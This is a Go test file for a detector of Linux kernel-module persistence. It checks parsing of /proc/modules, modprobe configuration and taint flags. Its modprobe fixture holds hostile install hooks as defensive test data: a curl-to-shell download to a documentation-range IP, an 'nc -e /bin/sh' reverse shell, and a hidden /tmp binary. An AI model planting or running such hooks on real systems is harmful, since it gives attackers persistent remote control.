package collector

import (
	"strings"
	"testing"
)

const procModulesFixture = `tls 155648 0 - Live 0x0000000000000000
vboxnetadp 28672 0 - Live 0x0000000000000000 (OE)
vboxdrv 704512 2 vboxnetadp,vboxnetflt, Live 0xffffffffc0b4a000 (OE)
nvidia_drm 77824 4 - Live 0x0000000000000000 (PO)
snd_hda_codec_hdmi 94208 1 - Loading 0x0000000000000000 (+)
evil 16384 0 - Live 0x0000000000000000 (OEF)
btrfs 1765376 - - Live 0x0000000000000000
garbage line
`

func TestParseProcModules(t *testing.T) {
	mods := parseProcModules([]byte(procModulesFixture))
	if len(mods) != 7 {
		t.Fatalf("got %d modules", len(mods))
	}
	vbox := mods[2]
	if vbox.Name != "vboxdrv" || vbox.Size != 704512 || vbox.Refcount != "2" || vbox.Taint != "OE" ||
		strings.Join(vbox.Deps, ",") != "vboxnetadp,vboxnetflt" || vbox.State != "Live" {
		t.Fatalf("vboxdrv: %+v", vbox)
	}
	if mods[4].State != "Loading" || mods[4].Taint != "" {
		t.Fatalf("loading module: %+v", mods[4])
	}
	if mods[6].Refcount != "-" || mods[6].Taint != "" {
		t.Fatalf("btrfs: %+v", mods[6])
	}
}

func TestJudgeLoadedModule(t *testing.T) {
	mods := parseProcModules([]byte(procModulesFixture))
	by := map[string]procModule{}
	for _, m := range mods {
		by[m.Name] = m
	}
	cases := []struct {
		name string
		boot []string
		want map[string]Severity
	}{
		{"btrfs", nil, nil},
		{"tls", nil, nil},
		{"vboxdrv", nil, map[string]Severity{"persistence.kmod_unsigned": SevNotable}},
		{"vboxdrv", []string{"/etc/modules-load.d/vbox.conf"}, map[string]Severity{"persistence.kmod_unsigned": SevSuspect}},
		{"nvidia_drm", nil, map[string]Severity{"persistence.kmod_out_of_tree": SevInfo}},
		{"evil", nil, map[string]Severity{"persistence.kmod_forced": SevSuspect, "persistence.kmod_unsigned": SevNotable}},
	}
	for _, c := range cases {
		got := rulesOf(judgeLoadedModule(by[c.name], c.boot))
		if len(got) != len(c.want) {
			t.Errorf("%s (boot %v): got %v", c.name, c.boot, keys(got))
		}
		for rule, sev := range c.want {
			if got[rule].Severity != sev {
				t.Errorf("%s: %s severity %q, want %q", c.name, rule, got[rule].Severity, sev)
			}
		}
	}
}

func TestParseModulesLoad(t *testing.T) {
	got := parseModulesLoad([]byte("# a comment\n; another\n\nsnd-pcm\n lp param=1 \nloop\n"))
	if strings.Join(got, ",") != "snd_pcm,lp,loop" {
		t.Fatalf("got %v", got)
	}
}

func TestParseAndJudgeModprobeHooks(t *testing.T) {
	conf := "# blacklisting, the stock ways\n" +
		"blacklist pcspkr\n" +
		"install usb-storage /bin/true\n" +
		"install firewire-core /usr/bin/false\n" +
		"install snd-pcm /sbin/modprobe --ignore-install snd-pcm && /sbin/modprobe snd-pcm-oss\n" +
		"options snd-hda-intel model=auto\n" +
		"install dccp /tmp/.cache/run \\\n  --quiet\n" +
		"install af_802154 /bin/sh -c 'curl -s http://198.51.100.7/x | sh'\n" +
		"remove vfat /usr/local/sbin/cleanup.sh\n" +
		"install cramfs /bin/true; nc -e /bin/sh 198.51.100.9 4444\n"
	hooks := parseModprobeConf([]byte(conf))
	if len(hooks) != 7 {
		t.Fatalf("got %d hooks: %+v", len(hooks), hooks)
	}
	if h := hooks[3]; h.Module != "dccp" || h.Command != "/tmp/.cache/run    --quiet" || h.Line != 7 {
		t.Fatalf("continued line: %+v", h)
	}
	want := []struct {
		module string
		rules  map[string]Severity
	}{
		{"usb_storage", nil},
		{"firewire_core", nil},
		{"snd_pcm", nil},
		{"dccp", map[string]Severity{"persistence.modprobe_hook": SevSuspect}},
		{"af_802154", map[string]Severity{"persistence.modprobe_hook": SevNotable, "exec.download_pipe_shell": ""}},
		{"vfat", map[string]Severity{"persistence.modprobe_hook": SevNotable}},
		{"cramfs", map[string]Severity{"persistence.modprobe_hook": SevNotable, "exec.reverse_shell": ""}},
	}
	for i, w := range want {
		h := hooks[i]
		if h.Module != w.module {
			t.Fatalf("hook %d is %q, want %q", i, h.Module, w.module)
		}
		got := rulesOf(judgeModprobeHook(h, "/etc/modprobe.d/x.conf"))
		if len(w.rules) == 0 && len(got) != 0 {
			t.Errorf("%s: stock directive flagged: %v", w.module, keys(got))
		}
		for rule, sev := range w.rules {
			f, ok := got[rule]
			if !ok {
				t.Errorf("%s: %s missing (got %v)", w.module, rule, keys(got))
			} else if sev != "" && f.Severity != sev {
				t.Errorf("%s: %s is %s, want %s", w.module, rule, f.Severity, sev)
			}
		}
	}
	if hooks[5].Kind != "remove" || hooks[5].Line != 10 {
		t.Errorf("remove directive: %+v", hooks[5])
	}
}

func TestKernelTaint(t *testing.T) {
	cases := []struct {
		v       uint64
		letters string
		sev     Severity
	}{
		{0, "", ""},
		{1 << 12, "O", SevInfo},
		{1<<12 | 1<<13, "OE", SevNotable},
		{1 << 1, "F", SevNotable},
		{1<<0 | 1<<9, "PW", SevInfo},
	}
	for _, c := range cases {
		letters, reasons := decodeTaint(c.v)
		if letters != c.letters || len(reasons) != len(c.letters) {
			t.Errorf("%d: letters %q reasons %v", c.v, letters, reasons)
		}
		got := judgeKernelTaint(c.v)
		if c.sev == "" {
			if len(got) != 0 {
				t.Errorf("%d: unexpected %v", c.v, got)
			}
			continue
		}
		if len(got) != 1 || got[0].Severity != c.sev || got[0].Rule != "kernel.tainted" {
			t.Errorf("%d: %+v", c.v, got)
		}
	}
}

func TestModuleTreeAndBootLoad(t *testing.T) {
	known := moduleTreeNames(
		[]byte("kernel/fs/btrfs/btrfs.ko.zst: kernel/lib/raid6/raid6_pq.ko.zst\nupdates/dkms/vboxdrv.ko:\n"),
		[]byte("kernel/fs/ext4/ext4.ko\n"),
		[]byte("alias net-pf-10 ipv6\nalias pci:v00008086d*sv*sd*bc*sc*i* e1000e\n"))
	for _, n := range []string{"btrfs", "vboxdrv", "ext4", "net_pf_10"} {
		if !known[n] {
			t.Errorf("%s not known (%v)", n, known)
		}
	}
	if judgeBootLoad("btrfs", []string{"/etc/modules"}, known) != nil {
		t.Error("a known module flagged")
	}
	if judgeBootLoad("ghost", []string{"/etc/modules"}, nil) != nil {
		t.Error("flagged without a module tree to check against")
	}
	if got := judgeBootLoad("ghost", []string{"/etc/modules-load.d/x.conf"}, known); len(got) != 1 || got[0].Rule != "persistence.kmod_boot_unknown" {
		t.Errorf("unknown boot module: %+v", got)
	}
}
